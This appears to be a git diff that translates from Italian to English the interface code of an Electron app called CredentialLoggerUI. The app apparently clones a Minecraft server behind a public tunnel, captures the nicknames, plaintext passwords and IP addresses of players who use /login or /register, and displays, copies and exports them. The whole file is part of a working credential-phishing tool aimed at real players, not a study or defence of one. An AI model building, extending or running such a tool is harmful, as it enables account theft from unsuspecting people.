@@ -117,7 +117,7 @@ class CredentialLoggerUI {
             this.updatePublicUrl(url);
         });
 
-        // Aggiornamenti info server
+        // Server info updates
         ipcRenderer.on('server-info-update', (event, info) => {
             if (info.version) {
                 document.getElementById('serverVersion').textContent = info.version;
@@ -127,19 +127,19 @@ class CredentialLoggerUI {
             }
         });
 
-        // Aggiornamento credenziali automatico
+        // Automatic credential update
         ipcRenderer.on('credentials-updated', () => {
-            console.log('🔄 Aggiornamento credenziali rilevato');
+            console.log('🔄 Automatic credential update detected');
             this.loadCredentialsSmooth();
         });
 
-        // Auto-refresh intelligente solo quando necessario
+        // Auto-refresh intelligently only when needed
         this.lastCredentialsCount = 0;
         setInterval(() => {
             if (this.isRunning && document.querySelector('.tab[data-tab="credentials"]').classList.contains('active')) {
                 this.checkCredentialsUpdate();
             }
-        }, 5000); // Ogni 5 secondi e solo se il tab è attivo
+        }, 5000); // Every 5 seconds and only if the tab is active
     }
 
     async scanServer() {
@@ -147,31 +147,31 @@ class CredentialLoggerUI {
         const port = parseInt(document.getElementById('serverPort').value) || 25565;
 
         if (!host) {
-            this.showNotification('Inserisci un host server', 'error');
+            this.showNotification('Enter a server host', 'error');
             return;
         }
 
-        this.showLoading('Scansione server in corso...');
-        this.addConsoleMessage(`🔍 Scansione server: ${host}:${port}`, 'info');
+        this.showLoading('Scanning server...');
+        this.addConsoleMessage(`🔍 Scanning server: ${host}:${port}`, 'info');
 
         try {
             const serverInfo = await ipcRenderer.invoke('get-server-info', host, port);
             
             if (serverInfo.error) {
-                this.addConsoleMessage(`❌ Errore scansione: ${serverInfo.error}`, 'error');
-                this.updateServerInfo('Errore', '-', '-');
+                this.addConsoleMessage(`❌ Scanning error: ${serverInfo.error}`, 'error');
+                this.updateServerInfo('Error', '-', '-');
             } else {
-                const version = serverInfo.version?.name || serverInfo.version || 'Sconosciuta';
-                const players = serverInfo.players ? 
+                const version = serverInfo.version?.name || serverInfo.version || 'Unknown';
+                const players = serverInfo.players ?
                     `${serverInfo.players.online || 0}/${serverInfo.players.max || 0}` : '0/0';
-                
-                this.addConsoleMessage(`✅ Server rilevato: ${version}`, 'success');
-                this.addConsoleMessage(`👥 Giocatori: ${players}`, 'info');
+
+                this.addConsoleMessage(`✅ Server detected: ${version}`, 'success');
+                this.addConsoleMessage(`👥 Players: ${players}`, 'info');
                 this.updateServerInfo('Online', version, players);
             }
         } catch (error) {
-            this.addConsoleMessage(`❌ Errore scansione: ${error.message}`, 'error');
-            this.updateServerInfo('Errore', '-', '-');
+            this.addConsoleMessage(`❌ Scanning error: ${error.message}`, 'error');
+            this.updateServerInfo('Error', '-', '-');
         }
 
         this.hideLoading();
@@ -182,12 +182,12 @@ class CredentialLoggerUI {
         const port = parseInt(document.getElementById('serverPort').value) || 25565;
 
         if (!host) {
-            this.showNotification('Inserisci un host server', 'error');
+            this.showNotification('Enter a server host', 'error');
             return;
         }
 
-        this.showLoading('Avvio cloner...');
-        this.addConsoleMessage(`🚀 Avvio cloner per ${host}:${port}`, 'info');
+        this.showLoading('Starting cloner...');
+        this.addConsoleMessage(`🚀 Starting cloner for ${host}:${port}`, 'info');
 
         try {
             const result = await ipcRenderer.invoke('start-cloner', host, port);
@@ -197,33 +197,33 @@ class CredentialLoggerUI {
                 this.startTime = Date.now();
                 this.startUptimeCounter();
                 this.updateControlsState();
-                this.updateStatusIndicator('active', 'Cloner attivo');
-                this.addConsoleMessage('✅ Cloner avviato con successo', 'success');
+                this.updateStatusIndicator('active', 'Cloner activated');
+                this.addConsoleMessage('✅ Cloner started successfully', 'success');
             } else {
-                this.addConsoleMessage(`❌ Errore avvio: ${result.message}`, 'error');
+                this.addConsoleMessage(`❌ Startup error: ${result.message}`, 'error');
             }
         } catch (error) {
-            this.addConsoleMessage(`❌ Errore avvio: ${error.message}`, 'error');
+            this.addConsoleMessage(`❌ Startup error: ${error.message}`, 'error');
         }
 
         this.hideLoading();
     }
 
     async stopCloner() {
-        this.showLoading('Arresto cloner...');
-        this.addConsoleMessage('🛑 Arresto cloner...', 'warning');
+        this.showLoading('Stopping cloner...');
+        this.addConsoleMessage('🛑 Stopping cloner...', 'warning');
 
         try {
             const result = await ipcRenderer.invoke('stop-cloner');
             
             if (result.success) {
                 this.handleClonerStopped(0);
-                this.addConsoleMessage('✅ Cloner fermato', 'success');
+                this.addConsoleMessage('✅ Cloner stopped', 'success');
             } else {
-                this.addConsoleMessage(`❌ Errore arresto: ${result.message}`, 'error');
+                this.addConsoleMessage(`❌ Stopping error: ${result.message}`, 'error');
             }
         } catch (error) {
-            this.addConsoleMessage(`❌ Errore arresto: ${error.message}`, 'error');
+            this.addConsoleMessage(`❌ Stopping error: ${error.message}`, 'error');
         }
 
         this.hideLoading();
@@ -234,9 +234,9 @@ class CredentialLoggerUI {
         this.startTime = null;
         this.stopUptimeCounter();
         this.updateControlsState();
-        this.updateStatusIndicator('inactive', 'Pronto');
-        this.updateServerInfo('Non connesso', '-', '-');
-        this.updateTunnelStatus('Inattivo');
+        this.updateStatusIndicator('inactive', 'Ready');
+        this.updateServerInfo('Not connected', '-', '-');
+        this.updateTunnelStatus('Inactive');
         this.updatePublicUrl('');
     }
 
@@ -253,7 +253,7 @@ class CredentialLoggerUI {
         });
         document.getElementById(`${tabName}Tab`).classList.add('active');
 
-        // Refresh data if needed (solo se non è già caricato)
+        // Refresh data if needed (only if not already loaded)
         if (tabName === 'credentials' && this.lastCredentialsCount === 0) {
             this.loadCredentials();
         }
@@ -290,8 +290,8 @@ class CredentialLoggerUI {
         const console = document.getElementById('console');
         console.innerHTML = `
             <div class="console-line welcome">
-                <span class="timestamp">[SISTEMA]</span>
-                <span class="message">🎯 Console pulita</span>
+                <span class="timestamp">[SYSTEM]</span>
+                <span class="message">🎯 Console cleared</span>
             </div>
         `;
     }
@@ -303,16 +303,16 @@ class CredentialLoggerUI {
             this.updateStats();
             this.lastCredentialsCount = this.credentialsData.credentials.length;
         } catch (error) {
-            this.addConsoleMessage(`❌ Errore caricamento credenziali: ${error.message}`, 'error');
+            this.addConsoleMessage(`❌ Credential loading error: ${error.message}`, 'error');
         }
     }
 
-    // Caricamento smooth senza effetto "balla"
+    // Smooth loading without "bouncing" effect
     async loadCredentialsSmooth() {
         try {
             const newData = await ipcRenderer.invoke('get-credentials');
-            
-            // Solo se ci sono davvero nuove credenziali
+
+            // Only if there are really new credentials
             if (newData.credentials.length !== this.lastCredentialsCount) {
                 this.credentialsData = newData;
                 this.renderCredentials();
@@ -320,11 +320,11 @@ class CredentialLoggerUI {
                 this.lastCredentialsCount = newData.credentials.length;
             }
         } catch (error) {
-            console.log('Errore aggiornamento smooth:', error.message);
+            console.log('Update error:', error.message);
         }
     }
 
-    // Controllo intelligente per aggiornamenti
+    // Intelligent check for updates
     async checkCredentialsUpdate() {
         try {
             const data = await ipcRenderer.invoke('get-credentials');
@@ -332,7 +332,7 @@ class CredentialLoggerUI {
                 this.loadCredentialsSmooth();
             }
         } catch (error) {
-            // Ignora errori silenziosi
+            // Ignore silent errors
         }
     }
 
@@ -343,8 +343,8 @@ class CredentialLoggerUI {
             container.innerHTML = `
                 <div class="no-data">
                     <i class="fas fa-key"></i>
-                    <p>Nessuna credenziale catturata</p>
-                    <small>Le credenziali appariranno qui quando i giocatori useranno /login o /register</small>
+                    <p>No credentials captured</p>
+                    <small>Credentials will appear here when players use /login or /register</small>
                 </div>
             `;
             return;
@@ -355,18 +355,18 @@ class CredentialLoggerUI {
         this.credentialsData.credentials.forEach(cred => {
             const item = document.createElement('div');
             item.className = 'credential-item';
-            
-            // Determina il tipo di credenziale per il colore
+
+            // Determine credential type for color
             const credType = cred.type || 'unknown';
             const isLogin = credType.includes('login');
             const isRegister = credType.includes('register');
-            
-            // Mostra solo credenziali con password (non connessioni)
+
+            // Show only credentials with password (not connections)
             if (!cred.password && credType === 'connection') {
                 return;
             }
-            
-            const nickname = cred.nickname || cred.username || 'Sconosciuto';
+
+            const nickname = cred.nickname || cred.username || 'Unknown';
             const serverOriginal = cred.server_original || cred.server || 'N/A';
             const clientIp = cred.client_ip || cred.ip || 'N/A';
             const dateTime = cred.date && cred.time ? `${cred.date} ${cred.time}` : new Date(cred.timestamp).toLocaleString('it-IT');
@@ -381,7 +381,7 @@ class CredentialLoggerUI {
                         <div class="field-label">Nickname</div>
                         <div class="field-value-with-copy">
                             <div class="field-value">${nickname}</div>
-                            <button class="copy-btn" data-copy="${nickname}" title="Copia Nickname">
+                            <button class="copy-btn" data-copy="${nickname}" title="Copy Nickname">
                                 <i class="fas fa-copy"></i>
                             </button>
                         </div>
@@ -390,16 +390,16 @@ class CredentialLoggerUI {
                         <div class="field-label">Password</div>
                         <div class="field-value-with-copy">
                             <div class="field-value password-field">${cred.password || 'N/A'}</div>
-                            <button class="copy-btn copy-btn-password" data-copy="${cred.password || ''}" title="Copia Password">
+                            <button class="copy-btn copy-btn-password" data-copy="${cred.password || ''}" title="Copy Password">
                                 <i class="fas fa-copy"></i>
                             </button>
                         </div>
                     </div>
                     <div class="credential-field">
-                        <div class="field-label">Server Originale</div>
+                        <div class="field-label">Original Server</div>
                         <div class="field-value-with-copy">
                             <div class="field-value">${serverOriginal}</div>
-                            <button class="copy-btn copy-btn-server" data-copy="${serverOriginal}" title="Copia Server">
+                            <button class="copy-btn copy-btn-server" data-copy="${serverOriginal}" title="Copy Server">
                                 <i class="fas fa-copy"></i>
                             </button>
                         </div>
@@ -409,11 +409,11 @@ class CredentialLoggerUI {
                         <div class="field-value">${clientIp}</div>
                     </div>
                     <div class="credential-field">
-                        <div class="field-label">Tipo</div>
+                        <div class="field-label">Type</div>
                         <div class="field-value">${isLogin ? '🔑 Login' : '📝 Register'}</div>
                     </div>
                     <div class="credential-field">
-                        <div class="field-label">Comando</div>
+                        <div class="field-label">Command</div>
                         <div class="field-value command-field">${cred.command || 'N/A'}</div>
                     </div>
                 </div>
@@ -422,22 +422,22 @@ class CredentialLoggerUI {
             container.appendChild(item);
         });
 
-        // Aggiungi event listeners per i pulsanti di copia
+        // Add event listeners for copy buttons
         this.setupCopyButtons();
     }
 
     async clearCredentials() {
-        if (confirm('Sei sicuro di voler cancellare tutte le credenziali?')) {
+        if (confirm('Are you sure you want to delete all credentials?')) {
             try {
                 const result = await ipcRenderer.invoke('clear-credentials');
                 if (result.success) {
                     this.loadCredentials();
-                    this.addConsoleMessage('✅ Credenziali cancellate', 'success');
+                    this.addConsoleMessage('✅ Credentials deleted', 'success');
                 } else {
-                    this.addConsoleMessage(`❌ Errore: ${result.message}`, 'error');
+                    this.addConsoleMessage(`❌ Error: ${result.message}`, 'error');
                 }
             } catch (error) {
-                this.addConsoleMessage(`❌ Errore: ${error.message}`, 'error');
+                this.addConsoleMessage(`❌ Error: ${error.message}`, 'error');
             }
         }
     }
@@ -446,12 +446,12 @@ class CredentialLoggerUI {
         try {
             const result = await ipcRenderer.invoke('export-credentials');
             if (result.success) {
-                this.addConsoleMessage('✅ Credenziali esportate', 'success');
+                this.addConsoleMessage('✅ Credentials exported', 'success');
             } else {
-                this.addConsoleMessage(`❌ Errore esportazione: ${result.message}`, 'error');
+                this.addConsoleMessage(`❌ Export error: ${result.message}`, 'error');
             }
         } catch (error) {
-            this.addConsoleMessage(`❌ Errore esportazione: ${error.message}`, 'error');
+            this.addConsoleMessage(`❌ Export error: ${error.message}`, 'error');
         }
     }
 
@@ -472,7 +472,7 @@ class CredentialLoggerUI {
     updateServerStatus(status) {
         const statusElement = document.getElementById('serverStatus');
         if (status === 'connected') {
-            statusElement.textContent = 'Connesso';
+            statusElement.textContent = 'Connected';
             statusElement.style.color = 'var(--success)';
         }
     }
@@ -480,17 +480,17 @@ class CredentialLoggerUI {
     updateTunnelStatus(status) {
         const tunnelElement = document.getElementById('tunnelStatus');
         if (status === 'active') {
-            tunnelElement.textContent = 'Attivo';
+            tunnelElement.textContent = 'Active';
             tunnelElement.style.color = 'var(--success)';
         } else {
-            tunnelElement.textContent = 'Inattivo';
+            tunnelElement.textContent = 'Inactive';
             tunnelElement.style.color = 'var(--text-muted)';
         }
     }
 
     updatePublicUrl(url) {
         const urlInput = document.getElementById('publicUrl');
-        urlInput.value = url || 'Nessun tunnel attivo';
+        urlInput.value = url || 'No active tunnel';
         
         const copyBtn = document.getElementById('copyUrlBtn');
         copyBtn.disabled = !url;
@@ -498,9 +498,9 @@ class CredentialLoggerUI {
 
     copyPublicUrl() {
         const urlInput = document.getElementById('publicUrl');
-        if (urlInput.value && urlInput.value !== 'Nessun tunnel attivo') {
+        if (urlInput.value && urlInput.value !== 'No active tunnel') {
             navigator.clipboard.writeText(urlInput.value).then(() => {
-                this.showNotification('URL copiato negli appunti', 'success');
+                this.showNotification('URL copied to clipboard', 'success');
             });
         }
     }
@@ -563,22 +563,18 @@ class CredentialLoggerUI {
 
     showNotification(message, type = 'info') {
         this.addConsoleMessage(message, type);
-        
-        // Could add toast notifications here in the future
     }
 
     updateUI() {
         this.updateControlsState();
-        this.updateStatusIndicator('inactive', 'Pronto');
+        this.updateStatusIndicator('inactive', 'Ready');
     }
 
     setupCopyButtons() {
-        // Rimuovi event listeners esistenti per evitare duplicati
         document.querySelectorAll('.copy-btn').forEach(btn => {
             btn.removeEventListener('click', this.handleCopy);
         });
 
-        // Aggiungi nuovi event listeners
         document.querySelectorAll('.copy-btn').forEach(btn => {
             btn.addEventListener('click', this.handleCopy.bind(this));
         });
@@ -589,14 +585,13 @@ class CredentialLoggerUI {
         const textToCopy = btn.getAttribute('data-copy');
         
         if (!textToCopy || textToCopy === 'N/A') {
-            this.showNotification('Nessun testo da copiare', 'warning');
+            this.showNotification('No text to copy', 'warning');
             return;
         }
 
         try {
             await navigator.clipboard.writeText(textToCopy);
             
-            // Feedback visivo
             const originalIcon = btn.innerHTML;
             btn.innerHTML = '<i class="fas fa-check"></i>';
             btn.style.background = '#4caf50';
@@ -606,16 +601,16 @@ class CredentialLoggerUI {
                 btn.style.background = '';
             }, 1000);
             
-            this.showNotification(`Copiato: ${textToCopy}`, 'success');
+            this.showNotification(`Copied: ${textToCopy}`, 'success');
             
         } catch (error) {
-            this.showNotification('Errore nella copia', 'error');
+            this.showNotification('Copy error', 'error');
         }
     }
 
-    // Funzione di test per verificare il sistema credenziali
+    // Test function to verify the credential system
     testCredentialSystem() {
-        // Simula una credenziale di test
+        // Simulate a test credential
         const testCred = {
             timestamp: new Date().toISOString(),
             username: 'TestUser123',
@@ -625,7 +620,7 @@ class CredentialLoggerUI {
             ip: '127.0.0.1'
         };
 
-        // Aggiungi alla lista locale per test
+        // Add to local list for testing
         if (!this.credentialsData.credentials) {
             this.credentialsData.credentials = [];
         }
@@ -636,8 +631,8 @@ class CredentialLoggerUI {
         this.renderCredentials();
         this.updateStats();
         
-        this.addConsoleMessage('🧪 Credenziale di test aggiunta', 'warning');
-        this.showNotification('Sistema credenziali testato con successo!', 'success');
+        this.addConsoleMessage('🧪 Test credential added', 'warning');
+        this.showNotification('Credential system tested successfully!', 'success');
     }
 }
 
